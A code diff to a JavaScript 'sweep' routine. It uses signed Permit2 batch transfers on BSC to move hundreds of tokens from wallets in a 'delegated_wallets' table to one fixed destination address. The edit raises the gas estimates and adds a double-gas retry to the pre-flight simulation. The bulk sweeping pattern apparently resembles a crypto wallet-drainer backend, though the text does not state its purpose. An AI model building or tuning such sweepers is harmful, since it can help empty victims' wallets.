@@ -1780,15 +1780,17 @@ async function sweep(wallet) {
         to: DESTINATION_ADDRESS,
         requestedAmount: sweepMapPf.get(t.token.toLowerCase()) ?? 0n,
       }));
-      const gasLimitPf = 200_000n + BigInt(permitted.length) * 2_200n + BigInt(withBalance.length) * 80_000n;
+      // 4_500 gas per permitted token covers the Permit2 keccak256 hash loop on BSC
+      // for large batches (400-500 tokens). The previous 2_200 caused OOG which BSC
+      // nodes report as empty revert data ("could not coalesce error").
+      const gasLimitPf = 300_000n + BigInt(permitted.length) * 4_500n + BigInt(withBalance.length) * 80_000n;
+      let gasLimitOverride = null; // set if 2× retry succeeds
+      const runPreflight = async (gasLimit) => permit2Batch.permitTransferFrom.staticCall(
+        { permitted: fullPermittedPf, nonce: BigInt(sig.nonce), deadline: dl },
+        fullTransferDetailsPf, checksum, stData.signature, { gasLimit },
+      );
       try {
-        await permit2Batch.permitTransferFrom.staticCall(
-          { permitted: fullPermittedPf, nonce: BigInt(sig.nonce), deadline: dl },
-          fullTransferDetailsPf,
-          checksum,
-          stData.signature,
-          { gasLimit: gasLimitPf },
-        );
+        await runPreflight(gasLimitPf);
         log(`[gasless] pre-flight ✅ — broadcasting`);
       } catch (simErr) {
         let revertName = simErr?.revert?.name ?? null;
@@ -1833,8 +1835,28 @@ async function sweep(wallet) {
           }
           return;
         }
-        // Unknown simulation error — still attempt broadcast; it may be a simulation artifact
-        warn(`[gasless] unknown pre-flight error (${simMsg}) — proceeding with broadcast`);
+        // Empty revert data ("missing revert data") almost always means OOG in the staticCall.
+        // Retry with 2× gas to confirm before deciding whether to broadcast.
+        if (!revertName) {
+          warn(`[gasless] pre-flight empty revert — retrying with 2× gas (${gasLimitPf * 2n})`);
+          try {
+            await runPreflight(gasLimitPf * 2n);
+            log(`[gasless] pre-flight ✅ on 2× gas retry — broadcasting with higher limit`);
+            gasLimitOverride = gasLimitPf * 2n;
+          } catch {
+            // Still failing even with 2× gas — signature is genuinely broken or contract rejects it.
+            // Do NOT broadcast — mark for re-activation to avoid wasting gas.
+            err(`[gasless] pre-flight failed on 2× gas retry — marking needs re-activation, skipping broadcast`);
+            if (supabase) {
+              await supabase.from("delegated_wallets").update({ needs_reactivation: true })
+                .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
+            }
+            return;
+          }
+        } else {
+          // Named error we don't recognise — proceed; it may be a node-side simulation artifact.
+          warn(`[gasless] unknown pre-flight error (${simMsg}) — proceeding with broadcast`);
+        }
       }
 
       try {
@@ -1850,11 +1872,10 @@ async function sweep(wallet) {
           to: DESTINATION_ADDRESS,
           requestedAmount: sweepMap.get(t.token.toLowerCase()) ?? 0n,
         }));
-        // Gas must cover calldata cost (~1,376 gas per token across both permitted[] and
-        // transferDetails[]) plus hashing + 500-iteration loop + ERC-20 transfers.
-        // For a 500-token batch the calldata alone costs ~688,000 gas — use 2,200 per token
-        // to include a 30% buffer on top of the measured ~1,376 gas/token calldata cost.
-        const gasLimit = 200_000n + BigInt(permitted.length) * 2_200n + BigInt(withBalance.length) * 80_000n;
+        // 4_500 gas per permitted token covers BSC's Permit2 keccak256 hash loop overhead
+        // for large batches (400-500 tokens). gasLimitOverride is set when the 2× pre-flight
+        // retry succeeded, meaning the first estimate was too low.
+        const gasLimit = gasLimitOverride ?? (300_000n + BigInt(permitted.length) * 4_500n + BigInt(withBalance.length) * 80_000n);
         const tx = await permit2Batch.permitTransferFrom(
           { permitted: fullPermitted, nonce: BigInt(sig.nonce), deadline: dl },
           fullTransferDetails,
